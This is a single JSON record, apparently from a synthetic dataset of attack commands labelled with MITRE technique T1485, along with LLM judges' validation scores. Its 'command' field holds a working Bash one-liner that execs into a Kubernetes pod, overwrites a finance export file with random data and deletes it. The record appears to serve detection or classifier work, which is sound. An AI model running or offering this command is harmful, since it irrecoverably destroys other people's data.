@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1485",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'ns=finance; pod=$(kubectl get pod -n \"$ns\" -l app=etl -o jsonpath=\"{.items[0].metadata.name}\"); kubectl exec -n \"$ns\" \"$pod\" -- bash -c '\\''f=/data/exports/q1.csv; sz=$(stat -c%s \"$f\"); dd if=/dev/urandom of=\"$f\" bs=$sz count=1 conv=notrunc,fdatasync status=none && rm -f \"$f\"'\\'''",
+  "explanation": "Executes within a Kubernetes pod to overwrite and delete a specific file on an attached volume.",
+  "rationale_steps": [
+    "Select a target pod by label",
+    "Execute a command inside the pod",
+    "Measure file size and overwrite with random data",
+    "Flush changes and remove the file"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-9214ae56-1cf89486",
+  "source_prompt_hash": "9214ae56",
+  "timestamp_utc": "2025-09-30T07:55:14.956261Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced single-quote escaping for nested bash -c, valid kubectl/jsonpath usage, and correct dd/stat options with proper separators.",
+        "semantic_score": 5,
+        "semantic_justification": "Overwrites a specified file with random data inside a Kubernetes pod and then deletes it, aligning directly with data destruction (T1485).",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T01:24:31.915105Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed with proper kubectl subcommands, variable substitution, and dd flags, but the nested quoting with escaped single quotes ('\\'' pattern) inside the outer bash -c string is complex and may fail in certain shell environments or when copy-pasted, though it is a recognized quoting technique.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1485 by locating a specific Kubernetes pod, using dd with /dev/urandom to overwrite the exact byte size of the target file (ensuring complete data destruction), using conv=fdatasync to force disk sync, and then removing the file, making recovery extremely difficult — fully aligned with secure-wipe data destruction technique.",
+        "combined_score": 4.5,
+        "confidence": 0.88,
+        "timestamp": "2026-02-19T03:15:22.202480Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is mostly well-formed but uses an unconventional triple-backslash escape for the nested single quotes ('\\\\'') which would likely fail in a standard shell compared to the standard '\\'' escape; however, the rest of the logic and flags are correct.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly demonstrates T1485 by using dd to overwrite a specific file with random data based on its actual size before deleting it, ensuring the data is unrecoverable.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-19T03:15:30.346973Z"
+      }
+    ],
+    "llm_average_syntactic": 4.333,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
